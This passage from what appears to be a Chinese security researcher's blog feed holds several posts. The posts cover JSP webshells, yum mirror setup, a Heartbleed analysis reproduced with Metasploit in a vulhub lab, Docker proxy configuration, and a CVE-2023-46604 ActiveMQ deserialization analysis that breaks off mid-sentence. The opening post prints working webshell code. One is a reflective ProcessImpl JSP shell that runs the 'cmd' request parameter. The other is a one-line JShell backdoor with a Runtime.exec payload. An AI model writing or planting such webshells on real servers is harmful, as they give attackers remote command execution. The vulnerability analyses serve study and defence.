            <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close();<br>            } <span class="hljs-keyword">finally</span> {<br>                <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close();<br>            }<br>        }<br>        <span class="hljs-comment">// 创建ProcessImpl实例</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> constructor.newInstance(<br>                cmds,<br>                <span class="hljs-literal">null</span>,<br>                <span class="hljs-literal">null</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">long</span>[]{-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>},<br>                <span class="hljs-literal">false</span><br>        );<br>        <span class="hljs-comment">// 获取命令执行的InputStream</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">inMethod</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredMethod(<span class="hljs-string">"getInputStream"</span>);<br>        inMethod.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-keyword">return</span> (InputStream) inMethod.invoke(object);<br>    }<br>    <br>    String <span class="hljs-title function_">inputStreamToString</span><span class="hljs-params">(InputStream in, String charset)</span> <span class="hljs-keyword">throws</span> IOException {<br>        <span class="hljs-keyword">try</span> {<br>            <span class="hljs-keyword">if</span> (charset == <span class="hljs-literal">null</span>) {<br>                charset = <span class="hljs-string">"UTF-8"</span>;<br>            }<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br><br>            <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) {<br>                out.write(b, <span class="hljs-number">0</span>, a);<br>            }<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(out.toByteArray());<br>        } <span class="hljs-keyword">catch</span> (IOException e) {<br>            <span class="hljs-keyword">throw</span> e;<br>        } <span class="hljs-keyword">finally</span> {<br>            <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>)<br>                in.close();<br>        }<br>    }<br>%&gt;<br>&lt;%<br>    String[] cmds = request.getParameterValues(<span class="hljs-string">"cmd"</span>);<br><br>    <span class="hljs-keyword">if</span> (cmds != <span class="hljs-literal">null</span>) {<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> start(cmds);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> inputStreamToString(in, <span class="hljs-string">"UTF-8"</span>);<br>        out.println(<span class="hljs-string">"&lt;pre&gt;"</span>);<br>        out.println(result);<br>        out.println(<span class="hljs-string">"&lt;/pre&gt;"</span>);<br>        out.flush();<br>        out.close();<br>    }<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="JShell执行系统命令"><a href="#JShell执行系统命令" class="headerlink" title="JShell执行系统命令"></a>JShell执行系统命令</h3><p>我还是第一次听说这个东西，还是太菜了。</p><p>从<code>Java 9</code>开始提供了一个叫<code>jshell</code>的功能，<code>jshell</code>是一个<code>REPL(Read-Eval-Print Loop)</code>命令行工具，提供了一个交互式命令行界面，在<code>jshell</code>中我们不再需要编写类也可以执行Java代码片段，开发者可以像<code>python</code>和<code>php</code>一样在命令行下愉快的写测试代码了。</p><p>命令行执行<code>jshell</code>即可进入<code>jshell</code>模式：</p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240910161456804.png" class="" title="image-20240910161456804"><p><code>jshell</code>不仅是一个命令行工具，在我们的应用程序中同样也可以调用<code>jshell</code>内部的实现API，也就是说我们可以利用<code>jshell</code>来执行Java代码片段而不再需要将Java代码编译成class文件后执行了。</p><p><code>jshell</code>调用了<code>jdk.jshell.JShell</code>类的<code>eval</code>方法来执行我们的代码片段，那么我们只要想办法调用这个<code>eval</code>方法也就可以实现真正意义上的一句话木马了。</p><p><strong><code>jshell.jsp</code>一句话木马示例:</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%=jdk.jshell.JShell.builder().build().eval(request.getParameter(<span class="hljs-string">"cmd"</span>))%&gt;<br></code></pre></td></tr></table></figure><p>只输出关键信息，修改为：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%=jdk.jshell.JShell.builder().build().eval(request.getParameter(<span class="hljs-string">"cmd"</span>)).get(<span class="hljs-number">0</span>).value().replaceAll(<span class="hljs-string">"^\""</span>, <span class="hljs-string">""</span>).replaceAll(<span class="hljs-string">"\"$"</span>, <span class="hljs-string">""</span>)%&gt;<br></code></pre></td></tr></table></figure><p>然后我们需要编写一个执行本地命令的代码片段：也就是参数``cmd`的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Runtime.getRuntime().exec(<span class="hljs-string">"pwd"</span>).getInputStream().readAllBytes())<br></code></pre></td></tr></table></figure><p><code>Java 9</code>的<code>java.io.InputStream</code>类正好提供了一个<code>readAllBytes</code>方法，我们从此以后再也不需要按字节读取了。</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>更换各种源的方法</title>
    <link href="/2024/07/30/%E6%9B%B4%E6%8D%A2%E5%90%84%E7%A7%8D%E6%BA%90%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <url>/2024/07/30/%E6%9B%B4%E6%8D%A2%E5%90%84%E7%A7%8D%E6%BA%90%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>记录各种需要换源的应用</p><span id="more"></span><h2 id="更换yum源"><a href="#更换yum源" class="headerlink" title="更换yum源"></a>更换yum源</h2><p>替换为阿里源</p><p>备份</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak<br></code></pre></td></tr></table></figure><p>替换</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo<br></code></pre></td></tr></table></figure><p>生成缓存</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum makecache<br></code></pre></td></tr></table></figure><p>更新软件列表</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y update<br></code></pre></td></tr></table></figure><img src="/2024/07/30/%E6%9B%B4%E6%8D%A2%E5%90%84%E7%A7%8D%E6%BA%90%E7%9A%84%E6%96%B9%E6%B3%95/image-20240730205730178.png" class="" title="image-20240730205730178"><p>使用国内源就非常快了</p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>心脏滴血漏洞分析与复现</title>
    <link href="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>之前写了TLS的详解，这里拓展一下心脏滴血这个声名远播的老洞</p><span id="more"></span><h2 id="心脏滴血漏洞-CVE-2014-0160"><a href="#心脏滴血漏洞-CVE-2014-0160" class="headerlink" title="心脏滴血漏洞(CVE-2014-0160)"></a>心脏滴血漏洞(CVE-2014-0160)</h2><p>一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。</p><p>此问题的原因是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过滤，即可以读取的数据比应该允许读取的还多。</p><p>HeartBleed主要存在与OpenSSL的1.0.1版本到1.0.1f版本。</p><p>利用该漏洞，攻击者每次可以远程读取服务器内存中至多64K的数据，获取内存中的敏感信息。</p><h3 id="心跳包"><a href="#心跳包" class="headerlink" title="心跳包"></a>心跳包</h3><p>可以简单了解一下心跳包的作用，它是一种用于保持TLS连接活跃并检测连接状态的小型数据包。在TLS连接建立之后，定期发送心跳包以确保连接在长时间没有数据传输时不被中断。如果未收到预期的响应，表明连接可能已断开或出现问题。</p><p>那么心跳请求是如何工作的：</p><p>心跳扩展允许一个TLS对等体向另一个对等体发送一个心跳请求，接收方应以心跳响应形式回送相同的数据。具体流程如下：</p><ol><li>心跳请求：一方发送包含随机数据和请求类型的心跳请求消息。</li><li>心跳响应：接收方在接收到心跳请求后，必须在心跳响应消息中返回相同的随机数据。</li></ol><p><strong>心跳消息的格式</strong>：</p><ul><li>类型：心跳请求或心跳响应。</li><li>Payload长度：负载数据的长度。</li><li>Payload数据：实际的负载数据，可以是任意内容。</li><li>Padding：可选的填充数据，确保消息长度符合特定要求。</li></ul><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>那么这个心脏滴血漏洞是如何形成的呢，其实很简单</p><p>在客户端发送完心跳包之后，服务端会短暂的存储心跳包中的内容，分配一个内存缓冲区（一个物理内存区域用以存储信息），<strong>该区域的存储空间和心跳请求信号里的长度一致</strong>。接下来，它会存储请求信号的加密数据到内存缓冲区，然后读取数据并将其发送回你的浏览器，来证明连接仍然存在。</p><p>关键是，OpenSSL官方编写的库函数里<strong>没有检查这个客户端心跳包的实际内容和它给定的长度</strong>，也就是说本身是一个10字节的数据，客户端声明了20字节的内容，服务端就会开辟20字节的空间，导致服务端返回了20字节的数据。</p><p>一句话：<strong>计算机接受心跳请求时从不检查该请求和它声称的内容是否一致，及从不检查所请求的数据长度是否和声称的数据长度一致，导致响应方返回额外长度的数据</strong>。</p><p>导致心脏出血漏洞的编程错误可以归于一行代码：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">memcpy</span>(bp, pl, payload);<br></code></pre></td></tr></table></figure><p>memcpy()是复制数据的命令。bp是被复制的数据的存储区域，pl是被复制的数据的来源，payload是被复制的数据长度。<strong>问题在于，该命令没有检验pl复制的数据是否和payload给予的长度相符。</strong></p><p>所有原理其实非常简单，早期的开发存在极大的安全隐患。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>首先默认已经配置好了docker以及下载了vulhub，打开openssl/CVE-2014-0160，使用<code>docker-compose up -d</code>拉取镜像，然后环境就搭建好了，攻击使用metasploit。</p><img src="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20240730213652497.png" class="" title="image-20240730213652497"><p>使用<code>docker ps</code>查看一下容器的状态，发现TCP服务开启在8080和8443端口。当然实际攻击使用端口扫描工具可以探测出来，比如Nmap。</p><img src="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20240730213838295.png" class="" title="image-20240730213838295"><p>接着我们打开Kali，使用命令<code>msfconsole</code>打开Metaspolit</p><img src="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20240730213959855.png" class="" title="image-20240730213959855"><p>搜索心脏滴血漏洞，然后<code>use 1</code></p><img src="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20240730214331388.png" class="" title="image-20240730214331388"><p>然后设置IP和端口，run就可以实现信息泄露，</p><img src="/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20240730214812629.png" class="" title="image-20240730214812629"><p>结束</p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机中docker配置代理</title>
    <link href="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <url>/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>不知道为啥Ubuntu里docker拉取镜像很慢，国内被墙了？</p><span id="more"></span><p>我这里的虚拟机是Ubuntu20.04</p><p>安装docker的具体步骤我这里就不说了，可以参考<a href="https://www.cnblogs.com/Can-daydayup/p/16472375.html">这篇文章</a></p><p><strong>这里主要说docker拉取镜像慢的问题</strong></p><h3 id="配置虚拟机流量走物理机代理"><a href="#配置虚拟机流量走物理机代理" class="headerlink" title="配置虚拟机流量走物理机代理"></a>配置虚拟机流量走物理机代理</h3><p>这里使用的代理软件是Clash.for.Windows，在其中开启允许局域网连接</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720200640809.png" class="" title="image-20240720200640809"><p>然查看一下物理机VM的NAT网卡的地址，</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720200730608.png" class="" title="image-20240720200730608"><p>在虚拟机中配置一下代理，</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720200925732.png" class="" title="image-20240720200925732"><p>配置一下HTTP和HTTPS一般就行了，然后填入物理机的局域网IP和你代理的端口号</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720201038704.png" class="" title="image-20240720201038704"><p>然后这里你的虚拟机流量就可以走物理机的代理了</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720201135135.png" class="" title="image-20240720201135135"><h3 id="配置docker-pull的代理"><a href="#配置docker-pull的代理" class="headerlink" title="配置docker pull的代理"></a>配置docker pull的代理</h3><p>使用下面的命令创建配置文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d<br>sudo vim /etc/systemd/system/docker.service.d/http-proxy.conf<br></code></pre></td></tr></table></figure><p>填充配置文件的内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">[Service]<br>Environment=<span class="hljs-string">"HTTP_PROXY=http://YOUR_PROXY_URL"</span><br>Environment=<span class="hljs-string">"HTTPS_PROXY=http://YOUR_PROXY_URL"</span><br>Environment=<span class="hljs-string">"NO_PROXY=localhost,127.0.0.1"</span><br></code></pre></td></tr></table></figure><p>然后重新加载docker：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure><p>然后就能愉快地拉取docker了</p><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720201526542.png" class="" title="image-20240720201526542"><img src="/2024/07/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADdocker%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20240720201625072.png" class="" title="image-20240720201625072">]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-46604分析</title>
    <link href="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>CVE-2023-46604 Apache ActiveMQ RCE 漏洞分析</p><span id="more"></span><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="消息队列——MessageQueue"><a href="#消息队列——MessageQueue" class="headerlink" title="消息队列——MessageQueue"></a>消息队列——MessageQueue</h3><p><a href="https://javaguide.cn/high-performance/message-queue/message-queue.html">参考JavaGuide</a></p><p>我们可以把消息队列看作是一个存放消息的容器，当我们需要使用消息的时候，直接从容器中取出消息供自己使用即可。由于队列 Queue 是一种先进先出的数据结构，所以消费消息时也是按照顺序来消费的。</p><p>参与消息传递的双方称为 <strong>生产者</strong> 和 <strong>消费者</strong> ，生产者负责发送消息，消费者负责处理消息。</p><p>操作系统中的进程通信的一种很重要的方式就是消息队列。我们这里提到的消息队列稍微有点区别，更多指的是各个服务以及系统内部各个组件/模块之前的通信，属于一种中间件 。</p><p>通常来说，使用消息队列主要能为我们的系统带来下面三点好处：</p><ol><li>异步处理</li><li>削峰/限流</li><li>降低系统耦合性</li></ol><p>除了这三点之外，消息队列还有其他的一些应用场景，例如实现分布式事务、顺序保证和数据流处理。</p><p><strong>消息队列使用发布-订阅模式工作，消息发送者（生产者）发布消息，一个或多个消息接受者（消费者）订阅消息。</strong> 从上图可以看到<strong>消息发送者（生产者）和消息接受者（消费者）之间没有直接耦合</strong>，消息发送者将消息发送至分布式消息队列即结束对消息的处理，消息接受者从分布式消息队列获取该消息后进行后续处理，并不需要知道该消息从何而来。<strong>对新增业务，只要对该类消息感兴趣，即可订阅该消息，对原有系统和业务没有任何影响，从而实现网站业务的可扩展性设计</strong>。</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240715104447299.png" class="" title="image-20240715104447299"><h3 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h3><p>ActiveMQ是Apache软件基金下的一个开源软件，它遵循JMS1.1规范（Java Message Service），是消息队列服务，是面向消息中间件（MOM）的最终实现，它为企业消息传递提供高可用、出色性能、可扩展、稳定和安全保障。</p><p>在ActiveMQ中，生产者（Producer）发送消息到Queue或者Topic中，消费者（consumer）通过ActiveMQ支持的传输协议连接到ActiveMQ接受消息并做处理。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache ActiveMQ &lt; 5.18.3<br>Apache ActiveMQ &lt; 5.17.6<br>Apache ActiveMQ &lt; 5.16.7<br>Apache ActiveMQ &lt; 5.15.16</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>安装ActiveMQ存在漏洞的版本，我这里以<a href="https://activemq.apache.org/components/classic/download/classic-05-17-03">5.17.3</a>为例</p><p>下载解压后，在bin文件夹下，使用<code>./activemq.bat start</code>启动服务，注意需要Java&gt;=11</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240716100938100.png" class="" title="image-20240716100938100"><p>创建Maven项目，配置依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.activemq<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>activemq-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.17.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在依赖里找到activemq-client里面的BaseDataStreamMarshaller，下载源码，此时这个包里的所有文件都是Java源码便于我们分析</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240715105311076.png" class="" title="image-20240715105311076"><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>首先，我先给出漏洞存在的代码，在<code>org/apache/activemq/openwire/v9/BaseDataStreamMarshaller.java</code>中，它存在一个<code>createThrowable</code>的函数，如下：</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717232911658.png" class="" title="image-20240717232911658"><p>可以看到，这里使用了反射，根据我们传入的类名生成了它的一个构造器对象，最后返回了这个类的一个实例。很显然，这里可以调用任意类造成RCE。</p><p>我们查看对<code>createThrowable</code>的调用，只有两处并且都在同一个类下，<code>tightUnmarsalThrowable</code>和<code>looseUnmarsalThrowable</code>，分别跳转过去看一眼。</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240716092233714.png" class="" title="image-20240716092233714"><p>我们可以看到，在<code>looseUnmarsalThrowable</code>中，调用了<code>looseUnmarsalString</code>对我们的传入进行处理，可以看到这里面只是把我们的输入转成Unicode字符集就直接返回了。而在另一个<code>tightUnmarsalThrowable</code>函数中，做了很多别的处理，可以自己去看看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// looseUnmarsalThrowable部分代码</span><br><span class="hljs-type">String</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> looseUnmarshalString(dataIn);<br><span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> looseUnmarshalString(dataIn);<br><span class="hljs-type">Throwable</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> createThrowable(clazz, message);<br><span class="hljs-comment">// 调用looseUnmarshalString</span><br><span class="hljs-keyword">protected</span> String <span class="hljs-title function_">looseUnmarshalString</span><span class="hljs-params">(DataInput dataIn)</span> <span class="hljs-keyword">throws</span> IOException {<br>    <span class="hljs-keyword">if</span> (dataIn.readBoolean()) {<br>        <span class="hljs-keyword">return</span> dataIn.readUTF();<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    }<br>}<br></code></pre></td></tr></table></figure><p>接着，查看对<code>looseUnmarsalThrowable</code>的调用，有好几个，那么我们重点关注了<code>ExceptionResponseMarshaller</code>这个类（当然其他的也可以），它是<code>BaseDataStreamMarshaller</code>的一个子类，按照名字来说就是对ExceptionResponse进行序列化处理的。</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240716093644841.png" class="" title="image-20240716093644841"><p>跳转到这个调用处，可以看到在这里面将o强转为<code>ExceptionResponse</code>类，然后进行反序列化</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717233157738.png" class="" title="image-20240717233157738"><p>反向分析就到这里，因为对于<code>looseUnmarshal</code>的调用太多了，我们现在还不确定在ActiveMQ中反序列化的具体流程，但是没有太大关系，目前很清晰的知道，只需要构造一个<code>ExceptionResponse</code>类的序列化数据，传递给ActiveMQ中进行反序列化，最终可以触发到<code>createThrowable</code>函数导致RCE</p><p>到目前我们的链子为：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">ExceptionResponseMarshaller<span class="hljs-comment">#looseUnmarshal</span><br>BaseDataStreamMarshaller<span class="hljs-comment">#looseUnmarsalThrowable</span><br>BaseDataStreamMarshaller<span class="hljs-comment">#createThrowable</span><br></code></pre></td></tr></table></figure><p>下面远程调试ActiveMQ，我们先编写一个测试类，用于发送OpenWire格式的数据。</p><p>这个相当于是生产者Client在向ActiveMQ服务端发送消息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br>    <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <br>        <span class="hljs-title class_">ActiveMQConnectionFactory</span>(<span class="hljs-string">"tcp://127.0.0.1:61616"</span>);<br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.createConnection();<br>    connection.start();<br><br>    <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> connection.createSession(<span class="hljs-literal">false</span>, Session.AUTO_ACKNOWLEDGE);<br>    <span class="hljs-type">Destination</span> <span class="hljs-variable">destination</span> <span class="hljs-operator">=</span> session.createQueue(<span class="hljs-string">"3xsh0re"</span>);<br><br>    <span class="hljs-type">MessageProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> session.createProducer(destination);<br>    <span class="hljs-type">TextMessage</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> session.createTextMessage(<span class="hljs-string">"Hello, ActiveMQ!"</span>);<br>    producer.send(message);<br><br>    session.close();<br>    connection.close();<br>}<br></code></pre></td></tr></table></figure><p><strong>注意接下来的调试是远程调试ActiveMQ</strong>，通过OpenWire通信的包会在<code>org.apache.activemq.openwire</code>的<code>doUnmarshal</code>函数中进行反序列化，这里需要DataType为31才会触发我们需要的反序列化函数</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717143136056.png" class=""><p>进一步处理，</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717143342022.png" class="" title="image-20240717143342022"><p>下面的问题转移到了如何构造一个<code>ExceptionResponse</code>的数据，接下来<strong>回到客户端的调试</strong></p><p>在数据进入到序列化函数之前，会进入到一个叫<code>oneway</code>的函数，这里学习到了一个patch手法，在当前源文件的目录下新建一个和依赖类相同路径的文件，根据classpath的默认调用顺序，会优先进入这个新的同名类中</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717144825617.png" class="" title="image-20240717144825617"><p>怎么做？</p><p>在当前源码目录下新建一个 <code>org.apache.activemq.transport.tcp.TcpTransport</code> 类, 然后重写对应的逻辑, 这样在运行的时候, 因为 classpath 查找顺序的问题, 